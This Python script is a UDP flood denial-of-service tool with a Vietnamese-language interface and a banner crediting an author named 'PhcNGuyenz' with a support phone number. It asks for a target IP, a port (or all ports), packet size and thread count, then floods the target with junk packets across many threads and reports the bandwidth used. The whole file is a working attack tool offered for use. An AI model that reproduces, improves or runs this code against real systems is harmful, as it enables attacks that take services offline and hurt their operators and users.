from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep
from getpass import getpass as hinput
import os
try:
    from pystyle import Col, System, Cursor, Colorate, Center, Add
except:
    os.system('pip install pystyle')

os.system("cls" if os.name == "nt" else "clear")

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white
blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))
ascii = r'''

'''
mbanner = r"""
╔═════════════════════════════════════════════════════╗
║ ███╗   ██╗██████║         ██████╗ ███████╗██╗   ██╗ ║
║ ████╗  ██║██  ██║         ██╔══██╗██╔════╝██║   ██║ ║
║ ██╔██╗ ██║██████║ ██████╗ ██║  ██║███████╗╚██╗ ██╔╝ ║
║ ██║╚██╗██║██╔═══╝ ╚═════╝ ██║  ██║██╔════╝ ╚████╔╝  ║
║ ██║ ╚████║██║             ██████╔╝███████╗  ╚██╔╝   ║
║ ╚═╝  ╚═══╝╚═╝             ╚═════╝ ╚══════╝   ╚═╝    ║
╠═════════════════════════════════════════════════════╣
║> Author   : PhcNGuyenz                              ║
║> Support  : 0937.127.172                            ║
╚═════════════════════════════════════════════════════╝ 
""".replace('▓', '▀')

def init():
    System.Size(140, 40)
    System.Title("DDOS by PhcNGuyenz")
    Cursor.HideCursor()

def stage(text, symbol = '...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()

class DDOS:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force 
        self.threads = threads 
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):
        self.total = 0
        interval = 0.05
        bytediff = 8
        size = 0
        mb = 1000000
        gb = 1000000000
        now = time()
        while self.on:
            sleep(interval)
            if not self.on:
                break
            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Tất cả: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')
            now2 = time()
            if now + 1 >= now2:
                continue
            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

def main():
    init()
    banner = Add.Add(ascii, mbanner, center=True)
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
    ip = input(stage(f"Nhập IP để DDOS {purple}->{fluo2} ", '?'))
    print()
    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        error("Lỗi! Vui lòng nhập địa chỉ IP chính xác.")
    port = input(stage(f"Nhập cổng(Port) {purple}[{white}nhấn {fluo2}Enter{white} để tấn công tất cả các cổng{purple}] {purple}->{fluo2} ", '?'))
    print()
    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Lỗi! Vui lòng nhập đúng cổng.")
    force = input(stage(f"Số byte mỗi gói {purple}[{white}nhấn {fluo2}Enter{white} cho 1024{purple}] {purple}->{fluo2} ", '?'))
    print()
    if force == '':
        force = 1024
    else:
        try:
            force = int(force)
        except ValueError:
            error("Lỗi! Vui lòng nhập số nguyên.")
    threads = input(stage(f"Threads {purple}[{white}nhấn {fluo2}Enter{white} cho 100{purple}] {purple}->{fluo2} ", '?'))
    print()
    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Lỗi! Vui lòng nhập số nguyên.")
    print()
    cport = '' if port is None else f'{purple}:{fluo2}{port}'
    print(stage(f"Bắt đầu tấn công vào {fluo2}{ip}{cport}{white}."), end='\r')
    brute = DDOS(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("Một lỗi đã xảy ra và cuộc tấn công đã bị dừng lại.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"Cuộc tấn công dừng lại. {fluo2}{ip}{cport}{white} đã bị DDOS với {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
    print('\n')
    sleep(1)
    hinput(stage(f"Nhấn {fluo2}Enter{white} để {fluo}thoát{white}.", '.'))

main()
